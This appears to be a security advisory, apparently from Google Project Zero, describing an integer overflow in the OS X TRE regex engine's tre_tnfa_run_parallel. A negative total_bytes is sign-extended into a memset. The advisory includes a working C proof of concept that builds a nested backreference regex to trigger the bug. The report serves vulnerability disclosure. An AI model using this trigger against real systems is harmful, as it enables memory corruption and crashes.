@@ -1,0 +1,92 @@
+Source:  https://code.google.com/p/google-security-research/issues/detail?id=429
+
+The OS X regex engine function tre_tnfa_run_parallel contains the following code:
+
+  int tbytes;
+...
+  if (!match_tags)
+    num_tags = 0;
+  else
+    num_tags = tnfa->num_tags;
+
+...
+  {
+    int rbytes, pbytes, total_bytes;
+    char *tmp_buf;
+    /* Compute the length of the block we need. */
+    tbytes = sizeof(*tmp_tags) * num_tags;
+    rbytes = sizeof(*reach_next) * (tnfa->num_states + 1);
+    pbytes = sizeof(*reach_pos) * tnfa->num_states;
+    total_bytes =
+      (sizeof(long) - 1) * 4 /* for alignment paddings */
+      + (rbytes + tbytes * tnfa->num_states) * 2 + tbytes + pbytes;
+
+    DPRINT(("tre_tnfa_run_parallel, allocate %d bytes\n", total_bytes));
+    /* Allocate the memory. */
+#ifdef TRE_USE_ALLOCA
+    buf = alloca(total_bytes);
+#else /* !TRE_USE_ALLOCA */
+    buf = xmalloc((unsigned)total_bytes);  <-- malloc is called, not alloca
+#endif /* !TRE_USE_ALLOCA */
+    if (buf == NULL)
+      return REG_ESPACE;
+    memset(buf, 0, (size_t)total_bytes);
+
+
+num_states and num_tags are computed based on the requirements of the regex and it's quite easy to make them each >64k with a relatively small regex. Note that total_bytes is an int and part of its calculation is the product of num_states and num_tags.
+
+The types here are all over the place and there's conversion between int, unsigned's and size_t.
+
+The attached PoC causes total_bytes to become negative leading to total_bytes being sign-extended in the memset call.
+
+Severity medium because I haven't looked for exposed attack surface yet, but this doesn't require any non-standard flags (only REG_EXTENDED which is almost always used.)
+
+Proof of Concept:
+
+//ianbeer
+
+#include <pthread.h>
+#include <regex.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define DEFAULT_REG_FLAGS (REG_EXTENDED)
+
+void* go(void* arg){
+  unsigned int nesting_level = 20;
+  size_t inner_size = nesting_level*2+10;
+  char* inner = malloc(inner_size);
+
+  memset(inner, '(', nesting_level);
+  inner[nesting_level] = '\\';
+  inner[nesting_level+1] = '1';
+  memset(&inner[nesting_level+2], ')', nesting_level);
+  inner[nesting_level*2+2] = '\x00';
+
+  unsigned int n_captures = 0x1000;
+  char* regex = malloc(n_captures * inner_size + 100);
+  strcpy(regex, "f(o)o((b)a(r))");
+  for (unsigned int i = 0; i < n_captures; i++) {
+    strcat(regex, inner);
+  }
+  strcat(regex, "r\\1o|\\2f|\\3l|\\4");
+  const char* match_against = "hellothar!";
+
+  regex_t re;
+  
+  int err = regcomp (&re, regex, DEFAULT_REG_FLAGS);
+  if (err == 0) {
+    void* something = malloc(100);
+    regexec (&re, match_against, 1, (regmatch_t*)something, DEFAULT_REG_FLAGS);
+  }
+  return NULL;
+}
+
+int main (int argc, char const** argv)
+{
+  go(NULL);
+  return 0;
+}
